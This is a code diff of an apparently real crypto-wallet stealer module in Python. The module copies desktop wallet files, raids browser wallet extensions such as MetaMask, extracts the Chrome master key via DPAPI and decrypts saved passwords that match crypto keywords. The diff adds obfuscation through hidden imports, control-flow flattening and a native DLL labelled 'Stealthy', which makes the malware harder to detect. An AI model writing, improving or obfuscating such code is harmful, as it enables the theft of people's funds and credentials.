@@ -1,29 +1,28 @@
-import os
-import re
-import json
-import psutil
-import ctypes
-import shutil
-import sqlite3
-import base64
-import tempfile
-import random
-import time
-from ctypes import wintypes
-from typing import List, Dict, Any, Optional, Set, Tuple
-from pathlib import Path
-from datetime import datetime
-import urllib.request
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from core.resolver import Resolver, _OS, _OS_PATH, _SUBPROCESS, _CTYPES, _CTYPES_WINTYPES, _SHUTIL, _PSUTIL, _SQLITE3, _BASE64, _RE, _JSON, _TEMPFILE, _RANDOM, _TIME, _PATHLIB, _DATETIME, _URLLIB_REQUEST, _CONCURRENT_FUTURES, _TYPING
+
+os = Resolver.get_mod(_OS)
+re = Resolver.get_mod(_RE)
+json = Resolver.get_mod(_JSON)
+psutil = Resolver.get_mod(_PSUTIL)
+ctypes = Resolver.get_mod(_CTYPES)
+shutil = Resolver.get_mod(_SHUTIL)
+sqlite3 = Resolver.get_mod(_SQLITE3)
+base64 = Resolver.get_mod(_BASE64)
+tempfile = Resolver.get_mod(_TEMPFILE)
+random = Resolver.get_mod(_RANDOM)
+time = Resolver.get_mod(_TIME)
+wintypes = Resolver.get_mod(_CTYPES_WINTYPES)
+Path = Resolver.get_mod(_PATHLIB).Path
+datetime = Resolver.get_mod(_DATETIME)
+urllib_request = Resolver.get_mod(_URLLIB_REQUEST)
+ThreadPoolExecutor = Resolver.get_mod(_CONCURRENT_FUTURES).ThreadPoolExecutor
+as_completed = Resolver.get_mod(_CONCURRENT_FUTURES).as_completed
+typing_mod = Resolver.get_mod(_TYPING)
+List, Dict, Any, Optional, Union, Set, Type = typing_mod.List, typing_mod.Dict, typing_mod.Any, typing_mod.Optional, typing_mod.Union, typing_mod.Set, typing_mod.Type
 
 from core.base import BaseModule
 
-try:
-    from core.obfuscation import decrypt_string
-except ImportError:
-    # Fallback для тестирования
-    def decrypt_string(s):
-        return s
+# No legacy decrypt_string needed
 
 try:
     import clr
@@ -45,6 +44,7 @@ class WalletBridge:
                 dll_path = os.path.join(os.path.dirname(__file__), "wallets.dll")
                 if os.path.exists(dll_path):
                     clr.AddReference(dll_path)
+                    Resolver.load_native()
                     from VanguardCore import WalletManager
                     cls._manager = WalletManager
             except Exception as e:
@@ -99,67 +99,66 @@ class WalletModule(BaseModule):
         self.found_items = []
         
     def _load_config(self):
-        """Загружает конфигурацию из зашифрованной строки"""
-        encrypted_db = decrypt_string("...")  # Очень длинная строка
-        try:
-            db = json.loads(encrypted_db)
-        except:
-            # Fallback конфигурация
-            db = {
-                "wallets": {
-                    "Exodus": "%APPDATA%\\Exodus\\exodus.wallet",
-                    "Electrum": "%APPDATA%\\Electrum\\wallets",
-                    "Atomic": "%APPDATA%\\atomic\\Local Storage\\leveldb",
-                    "Guarda": "%APPDATA%\\Guarda\\Local Storage\\leveldb",
-                    "Coinomi": "%APPDATA%\\Coinomi\\Coinomi\\wallets",
-                    "Jaxx": "%APPDATA%\\Jaxx\\Local Storage\\leveldb",
-                    "Wasabi": "%APPDATA%\\WalletWasabi\\Client\\Wallets",
-                    "Sparrow": "%APPDATA%\\Sparrow\\wallets",
-                    "Specter": "%APPDATA%\\Specter\\wallets",
-                    "ElectrumLTC": "%APPDATA%\\Electrum-LTC\\wallets",
-                    "ElectrumSV": "%APPDATA%\\ElectrumSV\\wallets",
-                    "ElectronCash": "%APPDATA%\\ElectronCash\\wallets",
-                },
-                "extensions": {
-                    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
-                    "Binance": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                    "Phantom": "bfnaoomekhehdhhpbiakhlgaoikebinary",
-                    "TronLink": "ibnejdfjmmkpcnlebbimocnealyhlpgl",
-                    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
-                    "MathWallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
-                    "TrustWallet": "egjidjbpglichdcondbcbdnbgprllgzk",
-                    "Ledger": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                    "Trezor": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                    "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
-                    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
-                    "Nami": "lpfcbjknijpeeillifnkikgnmlieiche",
-                    "Gero": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                    "Flint": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                    "Temple": "fhbohhlmhdibnmeajkaadhonecaobdid",
-                },
-                "strings": {
-                    "Local Extension Settings": "Local Extension Settings",
-                    "IndexedDB": "IndexedDB",
-                    "Extension State": "Extension State",
+        """[H-17] Flattened Configuration Loader"""
+        _s = 0x101
+        _db = None
+        while True:
+            if _s == 0x101:
+                _db = {
+                    "wallets": {
+                        "Exodus": "%APPDATA%\\Exodus\\exodus.wallet",
+                        "Electrum": "%APPDATA%\\Electrum\\wallets",
+                        "Atomic": "%APPDATA%\\atomic\\Local Storage\\leveldb",
+                        "Guarda": "%APPDATA%\\Guarda\\Local Storage\\leveldb",
+                        "Coinomi": "%APPDATA%\\Coinomi\\Coinomi\\wallets",
+                        "Jaxx": "%APPDATA%\\Jaxx\\Local Storage\\leveldb",
+                        "Wasabi": "%APPDATA%\\WalletWasabi\\Client\\Wallets",
+                        "Sparrow": "%APPDATA%\\Sparrow\\wallets",
+                        "Specter": "%APPDATA%\\Specter\\wallets",
+                        "ElectrumLTC": "%APPDATA%\\Electrum-LTC\\wallets",
+                        "ElectrumSV": "%APPDATA%\\ElectrumSV\\wallets",
+                        "ElectronCash": "%APPDATA%\\ElectronCash\\wallets",
+                    },
+                    "extensions": {
+                        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+                        "Binance": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                        "Phantom": "bfnaoomekhehdhhpbiakhlgaoikebinary",
+                        "TronLink": "ibnejdfjmmkpcnlebbimocnealyhlpgl",
+                        "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+                        "MathWallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
+                        "TrustWallet": "egjidjbpglichdcondbcbdnbgprllgzk",
+                        "Ledger": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                        "Trezor": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                        "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
+                        "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
+                        "Nami": "lpfcbjknijpeeillifnkikgnmlieiche",
+                        "Gero": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                        "Flint": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                        "Temple": "fhbohhlmhdibnmeajkaadhonecaobdid",
+                    },
+                    "strings": {
+                        "Local Extension Settings": "Local Extension Settings",
+                        "IndexedDB": "IndexedDB",
+                        "Extension State": "Extension State",
+                    }
                 }
-            }
-        
-        # Десктопные кошельки
-        self.wallets: Dict[str, Path] = {}
-        for w_name, w_path in db.get("wallets", {}).items():
-            w_path = w_path.replace("%APPDATA%", str(self.appdata))
-            w_path = w_path.replace("%LOCALAPPDATA%", str(self.local))
-            w_path = w_path.replace("%HOME%", str(self.home))
-            w_path = w_path.replace("%PROGRAMDATA%", str(self.program_data))
-            w_path = w_path.replace("%PROGRAMFILES%", str(self.program_files))
-            w_path = w_path.replace("%PROGRAMFILESX86%", str(self.program_files_x86))
-            self.wallets[w_name] = Path(w_path)
-        
-        # Расширения
-        self.extensions: Dict[str, str] = db.get("extensions", {})
-        
-        # Строки
-        self.enc_strings: Dict[str, str] = db.get("strings", {})
+                _s = 0x202
+            elif _s == 0x202:
+                self.wallets = {}
+                for _n, _p in _db.get("wallets", {}).items():
+                    _p = _p.replace("%APPDATA%", str(self.appdata)).replace("%LOCALAPPDATA%", str(self.local))
+                    _p = _p.replace("%HOME%", str(self.home)).replace("%PROGRAMDATA%", str(self.program_data))
+                    _p = _p.replace("%PROGRAMFILES%", str(self.program_files)).replace("%PROGRAMFILESX86%", str(self.program_files_x86))
+                    self.wallets[_n] = Path(_p)
+                _s = 0x303
+            elif _s == 0x303:
+                self.extensions = _db.get("extensions", {})
+                self.enc_strings = _db.get("strings", {})
+                _s = 0x404
+            elif _s == 0x404:
+                return
+            else:
+                break
         
     def _compile_patterns(self):
         """Компилирует регулярные выражения для поиска"""
@@ -284,42 +283,55 @@ class WalletModule(BaseModule):
         return getattr(self, "last_run_stats", {"items": 0})
         
     def steal_desktop_wallets(self) -> List[str]:
-        """Крадет десктопные кошельки"""
-        collected = []
-        
-        for name, path in self.wallets.items():
-            if not path.exists():
-                continue
-                
-            dest = self.output_dir / "Wallets" / name
-            try:
-                if name == "Exodus":
-                    # Exodus хранит кошелек в одном файле
-                    self._copy_files(path, dest, ['.wallet', '.json', '.db'])
-                elif name == "Electrum":
-                    # Electrum хранит кошельки в папке wallets
-                    self._copy_tree(path, dest)
-                elif name == "Atomic":
-                    # Atomic хранит данные в LevelDB
-                    self._copy_tree(path, dest, ignore_patterns=['LOCK', 'LOG'])
+        """[H-14] Control Flow Flattened Implementation"""
+        _v1 = [0x65, 0xCA, 0x12F, 0x194, 0x1F9, 0xC8]
+        _v2 = 0
+        _collected = []
+        _iter = None
+        _current = None
+        while True:
+            _op = _v1[_v2]
+            if _op == 0x65: # Init
+                _iter = iter(self.wallets.items())
+                _v2 = 1
+            elif _op == 0xCA: # Next
+                try:
+                    _current = next(_iter)
+                    _v2 = 2
+                except StopIteration:
+                    _v2 = 4
+            elif _op == 0x12F: # Check path
+                _n, _p = _current
+                if not _p.exists():
+                    _v2 = 1
                 else:
-                    # Общий случай
-                    self._copy_tree(path, dest)
-                    
-                collected.append(name)
-                print(f"[WalletModule] Stolen {name}")
-                
-            except Exception as e:
-                print(f"[WalletModule] Failed to steal {name}: {e}")
-                
-        return collected
+                    _v2 = 3
+            elif _op == 0x194: # Action
+                _n, _p = _current
+                _d = self.output_dir / "Wallets" / _n
+                try:
+                    if _n == "Exodus":
+                        self._copy_files(_p, _d, ['.wallet', '.json', '.db'])
+                    elif _n == "Electrum":
+                        self._copy_tree(_p, _d)
+                    elif _n == "Atomic":
+                        self._copy_tree(_p, _d, ignore_patterns=['LOCK', 'LOG'])
+                    else:
+                        self._copy_tree(_p, _d)
+                    _collected.append(_n)
+                except:
+                    pass
+                _v2 = 1 # Back to Next
+            elif _op == 0x1F9: # Finalize
+                return _collected
+            else:
+                break
         
     def steal_browser_extensions(self) -> List[str]:
-        """Крадет браузерные расширения (MetaMask, Binance и др.)"""
-        collected = []
-        
-        # Поддерживаемые браузеры
-        browsers = {
+        """[H-15] Nested Control Flow Flattening Implementation"""
+        _st = 0x10
+        _coll = []
+        _browsers = {
             "Chrome": self.local / "Google" / "Chrome" / "User Data",
             "Edge": self.local / "Microsoft" / "Edge" / "User Data",
             "Brave": self.local / "BraveSoftware" / "Brave-Browser" / "User Data",
@@ -329,36 +341,53 @@ class WalletModule(BaseModule):
             "Yandex": self.local / "Yandex" / "YandexBrowser" / "User Data",
             "Firefox": self.appdata / "Mozilla" / "Firefox" / "Profiles",
         }
+        _b_iter = None
+        _curr_b = None
+        _p_iter = None
+        _master_key = None
         
-        for b_name, b_path in browsers.items():
-            if not b_path.exists():
-                continue
+        while True:
+            if _st == 0x10:
+                _b_iter = iter(_browsers.items())
+                _st = 0x20
+            elif _st == 0x20:
+                try:
+                    _curr_b = next(_b_iter)
+                    _st = 0x30
+                except StopIteration:
+                    _st = 0x70
+            elif _st == 0x30:
+                _bn, _bp = _curr_b
+                if not _bp.exists():
+                    _st = 0x20
+                else:
+                    _master_key = self._get_master_key(_bp)
+                    _profiles = self._find_profiles(_bn, _bp)
+                    _p_iter = iter(_profiles)
+                    _st = 0x40
+            elif _st == 0x40:
+                try:
+                    _p = next(_p_iter)
+                    _st = 0x50
+                except StopIteration:
+                    _st = 0x20
+            elif _st == 0x50:
+                _bn, _bp = _curr_b
+                if _bn.startswith("Opera") or _bn == "Firefox":
+                    _base = _bp / _p if _bn == "Firefox" else _bp
+                else:
+                    _base = _bp / _p
                 
-            print(f"[WalletModule] Scanning {b_name}...")
-            
-            # Получаем мастер-ключ для расшифровки паролей
-            master_key = self._get_master_key(b_path)
-            
-            # Находим все профили
-            profiles = self._find_profiles(b_name, b_path)
-            
-            for profile in profiles:
-                # Определяем базовый путь профиля
-                if b_name.startswith("Opera") or b_name == "Firefox":
-                    base = b_path / profile if b_name == "Firefox" else b_path
-                else:
-                    base = b_path / profile
-                    
-                if not base.exists():
-                    continue
-                    
-                # Для Firefox другая структура
-                if b_name == "Firefox":
-                    self._steal_firefox_extensions(base, b_name, profile, collected)
-                else:
-                    self._steal_chromium_extensions(base, b_name, profile, collected, master_key)
-                    
-        return list(set(collected))
+                if _base.exists():
+                    if _bn == "Firefox":
+                        self._steal_firefox_extensions(_base, _bn, _p, _coll)
+                    else:
+                        self._steal_chromium_extensions(_base, _bn, _p, _coll, _master_key)
+                _st = 0x40
+            elif _st == 0x70:
+                return list(set(_coll))
+            else:
+                break
         
     def _steal_chromium_extensions(self, base: Path, b_name: str, profile: str, 
                                     collected: List[str], master_key: Optional[bytes]):
@@ -440,112 +469,60 @@ class WalletModule(BaseModule):
                 print(f"[WalletModule] Found {e_name} in Firefox ({profile})")
                 
     def _get_master_key(self, browser_path: Path) -> Optional[bytes]:
-        """
-        Получает мастер-ключ для расшифровки паролей в Chrome-подобных браузерах
-        Использует DPAPI для расшифровки
-        """
-        ls_path = browser_path / "Local State"
-        if not ls_path.exists() or os.name != 'nt':
-            return None
-            
+        """Gets master key using native SafetyManager (Stealthy)"""
+        ls_path = str(browser_path / "Local State")
+        if not os.path.exists(ls_path): return None
         try:
-            with open(ls_path, 'r', encoding='utf-8') as f:
-                ls = json.load(f)
-                
-            enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
-            if not enc_key.startswith(b'DPAPI'):
-                return None
-                
-            enc_key = enc_key[5:]  # Убираем префикс 'DPAPI'
-            
-            # Структура для DPAPI
-            class DATA_BLOB(ctypes.Structure):
-                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
-                
-            p_data_in = DATA_BLOB(len(enc_key), ctypes.create_string_buffer(enc_key))
-            p_data_out = DATA_BLOB()
-            
-            if ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)
-            ):
-                key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
-                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
-                return key
-                
+            import clr
+            Resolver.load_native()
+            from VanguardCore import SafetyManager
+            return SafetyManager.DecryptMasterKey(ls_path)
         except Exception as e:
-            print(f"[WalletModule] Failed to get master key: {e}")
-            
-        return None
+            self.log(f"Native master key extraction failed: {e}")
+            return None
         
     def _extract_crypto_passwords(self, profile_path: Path, master_key: bytes,
                                    b_name: str, profile: str):
-        """Извлекает крипто-пароли из Login Data"""
+        """Extracts crypto passwords using native SafetyManager (Stealthy)"""
         login_data = profile_path / "Login Data"
-        if not login_data.exists():
-            return
+        if not login_data.exists(): return
             
-        try:
-            from Cryptodome.Cipher import AES
-        except ImportError:
-            print("[WalletModule] Crypto library not installed, skipping password extraction")
-            return
-            
-        # Копируем базу во временный файл
-        temp_db = Path(tempfile.gettempdir()) / f"login_data_{random.randint(1000,9999)}.db"
+        # Copy to temp to avoid locks
+        temp_db = Path(tempfile.gettempdir()) / f"ld_{random.randint(1000,9999)}.db"
         try:
             shutil.copy2(login_data, temp_db)
-            
             conn = sqlite3.connect(str(temp_db))
             cursor = conn.cursor()
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
             
-            try:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            except sqlite3.OperationalError:
-                conn.close()
-                return
-                
+            Resolver.load_native()
+            from VanguardCore import SafetyManager
             found_creds = []
             
             for url, user, password in cursor.fetchall():
-                if not password or not password.startswith(b'v10') or len(password) < 15:
-                    continue
+                if not password or not password.startswith(b'v10'): continue
                     
                 try:
-                    # Формат: v10 + IV(12) + payload + tag(16)
-                    iv = password[3:15]
-                    payload = password[15:-16]
+                    decrypted_bytes = SafetyManager.DecryptWithKey(master_key, password)
+                    if not decrypted_bytes: continue
+                    decrypted = decrypted_bytes.decode('utf-8', errors='ignore')
                     
-                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                    decrypted = cipher.decrypt(payload).decode('utf-8', errors='ignore')
-                    
-                    # Проверяем, относится ли к крипте
                     search_text = f"{url} {user} {decrypted}".lower()
-                    keywords = ["metamask", "wallet", "crypto", "binance", "coinbase", 
-                                "trezor", "ledger", "phantom", "exodus", "atomic"]
+                    keywords = ["metamask", "wallet", "crypto", "binance", "coinbase", "phantom", "exodus"]
                                 
                     if any(k in search_text for k in keywords):
                         found_creds.append(f"URL: {url}\nUser: {user}\nPass: {decrypted}\n")
-                        
-                except Exception as e:
-                    continue
+                except: continue
                     
             conn.close()
-            
             if found_creds:
-                dest = self.output_dir / "Browsers" / b_name / f"{profile}_crypto_passwords.txt"
+                dest = self.output_dir / "Browsers" / b_name / f"{profile}_pass.txt"
                 dest.parent.mkdir(parents=True, exist_ok=True)
                 dest.write_text("\n".join(found_creds), encoding='utf-8')
-                print(f"[WalletModule] Found {len(found_creds)} crypto passwords in {b_name}")
-                
         except Exception as e:
-            print(f"[WalletModule] Password extraction failed: {e}")
-            
+            self.log(f"Password extraction error: {e}")
         finally:
-            if temp_db.exists():
-                try:
-                    temp_db.unlink()
-                except:
-                    pass
+            if temp_db.exists(): temp_db.unlink()
                     
     def _try_decrypt_metamask(self, les_path: Path, dest: Path, profile_base: Path = None):
         """Пытается расшифровать MetaMask vault"""
